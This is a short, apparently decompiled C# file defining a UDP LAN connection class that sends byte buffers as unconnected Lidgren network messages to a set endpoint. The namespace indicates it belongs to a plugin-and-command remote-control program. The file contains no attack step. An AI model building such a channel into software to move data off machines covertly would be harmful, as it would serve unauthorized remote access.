using System;
using System.Net;
using Lidgren.Network;
using Orcus.Plugins;
using Orcus.Shared.Data;

namespace Orcus.Commands.ConnectionInitializer;

public class UdpLanConnection : IDisposable, IConnection
{
	private readonly NetClient _netClient;

	private readonly IPEndPoint _ipEndPoint;

	public bool SupportsStream { get; }

	public UdpLanConnection(NetClient netClient, IPEndPoint ipEndPoint)
	{
		_netClient = netClient;
		_ipEndPoint = ipEndPoint;
	}

	public void Dispose()
	{
	}

	public void SendData(byte[] buffer, int offset, int length)
	{
		byte[] array;
		if (offset == 0 && length == buffer.Length)
		{
			array = buffer;
		}
		else
		{
			array = new byte[length];
			Buffer.BlockCopy(buffer, offset, array, 0, length);
		}
		NetOutgoingMessage val = ((NetPeer)_netClient).CreateMessage(length);
		((NetBuffer)val).Write(array);
		((NetPeer)_netClient).SendUnconnectedMessage(val, _ipEndPoint);
	}

	public void SendStream(WriterCall writerCall)
	{
		throw new NotSupportedException();
	}
}
